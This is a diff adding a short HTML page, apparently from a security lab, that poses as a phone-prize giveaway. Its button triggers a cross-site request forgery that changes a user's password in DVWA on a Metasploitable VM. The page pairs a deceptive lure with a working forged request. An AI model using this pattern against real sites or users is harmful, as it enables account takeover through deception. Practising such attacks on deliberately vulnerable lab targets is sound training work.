@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<title>Winner !!!</title>
+<body>
+
+<h1>congratulations You Have Won A New Phone</h1>
+<h2>Click the Button Below</h2>
+<!--change the ip depending on the Metasploitable VM-->
+<button onclick="changePass()">Click Prize</button>
+<script>
+	const changePass = () =>{
+		const url = "http://20.20.20.6/dvwa/vulnerabilities/csrf/?password_current=password&password_new=test&password_conf=test&Change=Change#";
+		window.open(url, "_blank");
+	}
+</script>
+
+</body>
+</html>
